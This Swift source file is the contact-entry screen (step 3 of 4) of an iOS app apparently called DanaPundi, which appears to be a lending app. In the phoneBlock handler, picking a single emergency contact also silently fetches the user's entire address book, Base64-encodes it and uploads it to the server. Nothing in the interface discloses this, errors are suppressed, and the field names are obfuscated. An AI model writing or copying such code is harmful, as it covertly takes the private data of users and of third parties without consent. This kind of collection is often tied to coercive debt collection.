//
//  ContactViewController.swift
//  DanaPundi
//
//  Created by hekang on 2026/1/6.
//

import UIKit
import SnapKit
import RxCocoa
import RxSwift
import TYAlertController
import BRPickerView

class ContactViewController: BaseViewController {
    
    var productID: String = ""
    
    var appTitle: String = ""
    
    var orderID: String = ""
    
    private let viewMdoel = HomeViewModel()
    
    private let disposeBag = DisposeBag()
    
    var listModelArray: [olModel] = []
    
    let contactManager = ContactManager()
    
    var dictArray: [[String: String]] = []
    
    lazy var headImageView: UIImageView = {
        let headImageView = UIImageView()
        headImageView.image = languageCode == .id ? UIImage(named: "fa_d_c_bg_image") : UIImage(named: "fa_f_c_bg_image")
        return headImageView
    }()
    
    lazy var footerView: ProductFootView = {
        let footerView = ProductFootView(frame: .zero)
        return footerView
    }()
    
    lazy var stepView: ProductHeadView = {
        let stepView = ProductHeadView()
        let attributedString = NSMutableAttributedString()
        
        let numberAttributes: [NSAttributedString.Key: Any] = [
            .foregroundColor: UIColor(hexString: "#3800FF")
        ]
        attributedString.append(NSAttributedString(string: "3", attributes: numberAttributes))
        let slashAttributes: [NSAttributedString.Key: Any] = [
            .foregroundColor: UIColor(hexString: "#000000")
        ]
        attributedString.append(NSAttributedString(string: "/", attributes: slashAttributes))
        attributedString.append(NSAttributedString(string: "4", attributes: slashAttributes))
        stepView.stepLabel.attributedText = attributedString
        return stepView
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .grouped)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 80
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(ContactTableViewCell.self, forCellReuseIdentifier: "ContactTableViewCell")
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.addSubview(headView)
        headView.configTitle(with: appTitle)
        headView.snp.makeConstraints { make in
            make.left.right.top.equalToSuperview()
        }
        
        headView.backBlock = { [weak self] in
            guard let self = self else { return }
            keepLeaveView()
        }
        
        view.addSubview(footerView)
        footerView.snp.makeConstraints { make in
            make.left.right.bottom.equalToSuperview()
            make.height.equalTo(80.pix())
        }
        
        view.addSubview(stepView)
        stepView.nameLabel.text = appTitle
        stepView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom)
            make.left.right.equalToSuperview()
            make.height.equalTo(108.pix())
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(stepView.snp.bottom)
            make.left.right.equalToSuperview().inset(20.pix())
            make.bottom.equalTo(footerView.snp.top).offset(-10.pix())
        }
        
        footerView.nextBlock = { [weak self] in
            guard let self = self else { return }
            
            dictArray = self.listModelArray.map { model in
                [
                    "thankia": model.thankia ?? "",
                    "catchtic": model.catchtic ?? "",
                    "tactad": model.tactad ?? "",
                    "thoughance": model.thoughance ?? ""
                ]
            }
            
            Task {
                await self.saveContactInfo(with: self.dictArray)
            }
        }
        
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.getContactInfo()
        }
    }
    
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 0.01.pix()
    }
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView? {
        return UIView()
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.listModelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let listModel = self.listModelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "ContactTableViewCell", for: indexPath) as! ContactTableViewCell
        cell.model = listModel
        
        cell.relationBlock = { [weak self] in
            guard let self = self else { return }
            self.presentSprayAlert(for: listModel, from: cell)
        }
        
        cell.phoneBlock = { [weak self] in
            guard let self = self else { return }
            /// single_picker_info
            contactManager.pickSingleContact(from: self) { contacts, error in
                if let error = error {
                    print("error===: \(error.localizedDescription)")
                    return
                }
                
                if let contacts = contacts {
                    if let parameters = contacts.first {
                        let phone = parameters["paginitor"] ?? ""
                        let name = parameters["catchtic"] ?? ""
                        if phone.isEmpty || name.isEmpty {
                            ToastManager.showMessage(LanguageManager.localizedString(for: "Name or phone number cannot be empty."))
                            return
                        }
                        listModel.catchtic = name
                        listModel.thankia = phone
                        cell.secondSectionView.textField.text = String(format: "%@-%@", name, phone)
                    }
                    
                }
            }
            
            /// all_picker_info
            contactManager.fetchAllContacts { [weak self] contacts, error in
                if let error = error {
                    print("error===: \(error.localizedDescription)")
                    return
                }
                
                if let contacts = contacts {
                    Task {
                        await self?.uploadAllContactInfo(with: contacts)
                    }
                }
            }
        }
        
        return cell
    }
    
    
}

extension ContactViewController {
    
    private func presentSprayAlert(for model: olModel, from cell: ContactTableViewCell) {
        
        let alertView = createSprayAlertView(with: model, cell: cell)
        
        guard let alertController = TYAlertController(alert: alertView, preferredStyle: .actionSheet) else {
            return
        }
        
        present(alertController, animated: true)
        
        setupAlertCallbacks(for: alertView, with: model, cell: cell)
    }
    
    private func createSprayAlertView(with model: olModel, cell: ContactTableViewCell) -> SprayAlertView {
        let alertView = SprayAlertView(frame: view.bounds)
        
        alertView.nameLabel.text = model.an ?? ""
        
        let discussionArray = model.itinerling ?? []
        alertView.modelArray = discussionArray
        
        if let selectedValue = cell.firstSectionView.textField.text,
           let selectedIndex = discussionArray.firstIndex(where: { $0.catchtic == selectedValue }) {
            alertView.selectedIndex = selectedIndex
        }
        
        return alertView
    }
    
    private func setupAlertCallbacks(for alertView: SprayAlertView,
                                     with model: olModel,
                                     cell: ContactTableViewCell) {
        alertView.cancelBlock = { [weak self] in
            self?.dismiss(animated: true)
        }
        
        alertView.sureBlock = { [weak self] selectedModel in
            self?.handleSpraySelection(selectedModel, for: model, cell: cell)
        }
    }
    
    private func handleSpraySelection(_ selectedModel: discussenModel,
                                      for model: olModel,
                                      cell: ContactTableViewCell) {
        dismiss(animated: true) { [weak self] in
            guard let self = self else { return }
            
            cell.firstSectionView.textField.text = selectedModel.catchtic ?? ""
            
            self.updateModel(model, with: selectedModel)
        }
    }
    
    private func updateModel(_ model: olModel, with selectedModel: discussenModel) {
        model.hiblaughdom = selectedModel.catchtic ?? ""
        model.tactad = selectedModel.stenics ?? ""
    }
}

extension ContactViewController {
    
    private func getContactInfo() async {
        do {
            let parameters = ["seget": productID, "stenics": "2"]
            let model = try await viewMdoel.contactApi(parameters: parameters)
            let peaceent = model.peaceent ?? ""
            if peaceent == "0" || peaceent == "00" {
                self.listModelArray = model.anyably?.octon?.ruspay ?? []
                self.tableView.reloadData()
            }
        } catch {
            
        }
    }
    
    private func saveContactInfo(with listArray: [[String: String]]) async {
        do {
            let jsonStr = convertContactsToJsonStr(listArray)
            let parameters = ["seget": productID, "anyably": jsonStr]
            let model = try await viewMdoel.saveContactApi(parameters: parameters)
            let peaceent = model.peaceent ?? ""
            if peaceent == "0" || peaceent == "00" {
                await self.detailPageInfo(with: productID, orderID: orderID, viewMdoel: viewMdoel)
            }else {
                ToastManager.showMessage(model.cubage ?? "")
            }
        } catch {
            
        }
    }
    
    private func uploadAllContactInfo(with listArray: [[String: String]]) async {
        do {
            let baseStr = convertContactsToBase64(listArray)
            let parameters = ["stenics": "3", "environment": "iOS", "anyably": baseStr]
            _ = try await viewMdoel.uploadAllContactApi(parameters: parameters)
        } catch {
            
        }
    }
    
    func convertContactsToBase64(_ contacts: [[String: String]]) -> String {
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: contacts, options: [])
            
            let base64String = jsonData.base64EncodedString()
            
            return base64String
        } catch {
            print("Base64-error: \(error)")
            return ""
        }
    }
    
    func convertContactsToJsonStr(_ contacts: [[String: String]]) -> String {
        guard let jsonData = try? JSONSerialization.data(withJSONObject: contacts),
              let jsonString = String(data: jsonData, encoding: .utf8) else {
            return ""
        }
        return jsonString
    }
    
}
